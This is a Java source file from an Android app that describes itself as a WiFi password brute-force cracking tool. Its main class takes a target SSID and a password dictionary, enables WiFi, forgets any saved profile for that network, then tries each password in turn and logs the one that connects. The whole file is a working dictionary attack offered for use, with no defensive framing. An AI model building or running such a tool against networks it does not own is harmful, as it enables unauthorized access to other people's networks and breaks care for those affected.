package wifi.pojie;

import android.annotation.SuppressLint;
import android.content.Context;

import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class WifiPojie {
    private static final String TAG = "WifiPojie";

    private final String ssid;
    private final String[] dictionary;
    private final int timeoutMillis;
    private final Consumer<String> logOutputFunction;
    private final TriConsumer<Integer, Integer, String> progressFunction;
    private final Runnable endFunc;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private ConnectWifi connectWifi;
    private boolean isDestroyed = false;
    private int currentTryIndex;

    /**
     * 构造函数
     *
     * @param config            运行参数
     * @param settings          设置内容
     * @param logOutputFunction 输出日志函数
     * @param progressFunction  设置进度函数(当前进度数字,总进度数字,进度信息文本)
     * @param endFunc           任务结束时执行的函数
     */
    public WifiPojie(Context context,
                     Map<String, ?> config,
                     Map<String, ?> settings,
                     Consumer<String> logOutputFunction,
                     TriConsumer<Integer, Integer, String> progressFunction,
                     Runnable endFunc) throws ExecutionException, InterruptedException {


        this.ssid = (String) config.get("ssid");
        this.dictionary = (String[]) config.get("dictionary");
        this.timeoutMillis = (int) config.get("timeoutMillis");
        this.logOutputFunction = logOutputFunction;
        this.progressFunction = progressFunction;
        this.endFunc = endFunc;
        this.currentTryIndex = (int) config.get("startLine") - 1;

        // 在后台线程启动破解过程
        logOutputFunction.accept("      _      __                 _        \n" +
                "     | |___ / _|_ __ ___  _   _| |_ __ _ \n" +
                "  _  | / __| |_| '_ ` _ \\| | | | __/ _` |\n" +
                " | |_| \\__ \\  _| | | | | | |_| | || (_| |\n" +
                "  \\___/|___/_| |_| |_| |_|\\__, |\\__\\__, |\n" +
                "                          |___/    |___/ \n" +
                "==========================================");
        logOutputFunction.accept("wifi密码暴力破解工具v2 for Android");

        try {
            connectWifi = new ConnectWifi(context, settings);

            if (!connectWifi.wifiIsEnabled()) {
                logOutputFunction.accept("wifi已关闭，正在打开wifi...");

                int turnonMode = (int) settings.get(SettingsManager.KEY_TURNON_MODE);

                if (turnonMode == 0) {
                    connectWifi.wifiManager.setWifiEnabled(true);
                    logOutputFunction.accept("请在打开WiFi后重新点击开始运行");
                    destroy();
                    return;
                } else if (turnonMode == 1)
                    ConnectWifi.runCommand("cmd wifi set-wifi-enabled enabled", (int) settings.get(SettingsManager.KEY_TURNON_MODE_CMD));
            }

            int netId = connectWifi.getWifiId(ssid);
            if (netId != -1) {
                connectWifi.forgetWifiName(ssid);
                logOutputFunction.accept("当前wifi已经保存，已自动忘记该网络");
            }


            assert dictionary != null;
            logOutputFunction.accept("开始运行 SSID:" + ssid + " 密码总数:" + dictionary.length + "\n");

            executorService.submit(this::startCrackingProcess);
        } catch (RuntimeException e) {
            logOutputFunction.accept("E: " + e);
            destroy();
        }
    }

    @SuppressLint("DefaultLocale")
    private void startCrackingProcess() {
        // 检查是否已被销毁
        if (isDestroyed || currentTryIndex >= dictionary.length) {
            if (currentTryIndex >= dictionary.length) {
                logOutputFunction.accept("所有密码尝试完毕，连接失败！");
            }
            destroy();
            return;
        }

        try {
            // 更新进度
            if (progressFunction != null) {
                progressFunction.accept(
                        currentTryIndex + 1,
                        dictionary.length,
                        String.format("%.1f", ((double)currentTryIndex * 100 / dictionary.length))+ "% [" + (currentTryIndex + 1) + "/" + dictionary.length + "] 正在尝试：" + dictionary[currentTryIndex]
                );
            }

            // 尝试连接
            connectWifi.connect(String.valueOf(ssid), dictionary[currentTryIndex], timeoutMillis, (result) -> {
                // 确保回调在非销毁状态下执行
                if (isDestroyed) {
                    return;
                }
                logOutputFunction.accept(
                        "密码:" + dictionary[currentTryIndex] +
                                " 结果:" + result
                );

                if (Objects.equals(result, "success")) {
                    // 成功连接
                    logOutputFunction.accept("成功连接到WiFi网络: " + ssid + " 密码: " + dictionary[currentTryIndex]);
                    destroy();
                } else {
                    connectWifi.forgetWifiName(ssid);
                    currentTryIndex++;
                    executorService.submit(this::startCrackingProcess);
                }
            });
        } catch (Exception e) {
            logOutputFunction.accept("E: " + e.getMessage());
            destroy();
        }
    }

    public void destroy() {
        if (isDestroyed) return;
        isDestroyed = true;
        if (connectWifi != null) connectWifi.destroy();
        executorService.shutdownNow();
        if (logOutputFunction != null) {
            logOutputFunction.accept("==运行结束==");
        }

        if (endFunc != null) {
            endFunc.run();
        }
    }


    @FunctionalInterface
    public interface TriConsumer<T, U, V> {
        void accept(T t, U u, V v);
    }
}